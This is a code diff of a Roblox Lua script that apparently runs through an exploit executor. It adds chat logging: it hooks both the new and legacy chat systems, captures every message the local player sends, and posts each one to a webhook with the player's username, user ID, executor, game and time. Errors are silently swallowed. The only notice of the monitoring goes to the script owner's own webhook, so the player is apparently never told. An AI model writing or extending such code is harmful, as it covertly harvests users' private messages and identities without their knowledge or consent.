@@ -1,5 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- Wait for LocalPlayer
 local player = Players.LocalPlayer
@@ -132,6 +134,97 @@ local function getSessionTime()
 	return string.format("%dm %ds", minutes, seconds)
 end
 
+-- Send chat message webhook
+local function sendChatWebhook(message)
+	pcall(function()
+		local info = getPlayerInfo()
+		
+		local data = {
+			["embeds"] = {{
+				["title"] = "💬 Chat Message Logged",
+				["description"] = "User sent a message in chat",
+				["color"] = 3447003, -- Blue color
+				["fields"] = {
+					{
+						["name"] = "👤 Username",
+						["value"] = "`" .. info.Username .. "`",
+						["inline"] = true
+					},
+					{
+						["name"] = "🆔 User ID",
+						["value"] = "`" .. tostring(info.UserId) .. "`",
+						["inline"] = true
+					},
+					{
+						["name"] = "⚙️ Executor",
+						["value"] = "**" .. info.Executor .. "**",
+						["inline"] = true
+					},
+					{
+						["name"] = "💭 Message",
+						["value"] = "```" .. message .. "```",
+						["inline"] = false
+					},
+					{
+						["name"] = "🎮 Game",
+						["value"] = info.GameName,
+						["inline"] = true
+					},
+					{
+						["name"] = "⏰ Time",
+						["value"] = info.ExecutorTime,
+						["inline"] = true
+					}
+				},
+				["thumbnail"] = {
+					["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. info.UserId .. "&width=150&height=150&format=png"
+				},
+				["footer"] = {
+					["text"] = "Chat Logger • " .. info.Executor
+				},
+				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+			}}
+		}
+		
+		local jsonData = HttpService:JSONEncode(data)
+		
+		request({
+			Url = webhookUrl,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = jsonData
+		})
+	end)
+end
+
+-- Monitor chat messages (New TextChatService)
+local function setupNewChatMonitoring()
+	pcall(function()
+		local textChannels = TextChatService:WaitForChild("TextChannels")
+		local generalChannel = textChannels:WaitForChild("RBXGeneral")
+		
+		generalChannel.MessageReceived:Connect(function(message)
+			if message.TextSource and message.TextSource.UserId == player.UserId then
+				sendChatWebhook(message.Text)
+			end
+		end)
+	end)
+end
+
+-- Monitor chat messages (Legacy Chat)
+local function setupLegacyChatMonitoring()
+	pcall(function()
+		local ReplicatedModules = game:GetService("Chat"):WaitForChild("ClientChatModules")
+		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
+		
+		player.Chatted:Connect(function(message)
+			sendChatWebhook(message)
+		end)
+	end)
+end
+
 -- Send webhook notification
 local function sendWebhook(executionCount, isNewUser)
 	local success, err = pcall(function()
@@ -204,7 +297,7 @@ local function sendWebhook(executionCount, isNewUser)
 					},
 					{
 						["name"] = "📊 Session Status",
-						["value"] = "🟢 **Active** (Just Started)",
+						["value"] = "🟢 **Active** (Just Started) | 💬 **Chat Monitoring: ON**",
 						["inline"] = false
 					}
 				},
@@ -368,10 +461,15 @@ player.AncestryChanged:Connect(function()
 	sendSessionEnd(executionCount)
 end)
 
+-- Initialize
 local count, isNew = updateExecutionCount()
 executionCount = count
 
 sendWebhook(executionCount, isNew)
+
+-- Setup chat monitoring (try both new and legacy systems)
+setupNewChatMonitoring()
+setupLegacyChatMonitoring()
 
 -- Return success
 return true
